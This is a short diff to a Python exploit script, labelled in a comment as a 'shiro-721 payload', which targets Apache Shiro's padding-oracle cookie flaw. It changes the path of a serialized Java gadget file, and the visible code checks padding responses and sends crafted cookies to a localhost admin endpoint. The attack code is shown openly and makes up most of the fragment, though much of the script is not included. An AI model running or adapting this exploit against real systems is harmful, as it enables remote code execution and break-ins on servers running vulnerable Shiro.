@@ -4,6 +4,7 @@ from grequests import request
 from base64 import b64decode, b64encode
 from Crypto.Util.Padding import pad
 
+#shiro-721 payload
 class Payload(payload_model):
 
     def padding_ok(self, resp:Response):
@@ -28,6 +29,6 @@ class Payload(payload_model):
         return request("get", "http://127.0.0.1:8080/admin", cookies=cookies)
 
 if __name__ == "__main__":
-    exp = open("/application/source/code/java/demo/src/main/resources/serialize/cs2Test.ser", "rb").read()
+    exp = open("cs2Test.ser", "rb").read()
     payload = Payload(bytes.hex(exp), fake=True)
     payload.run()
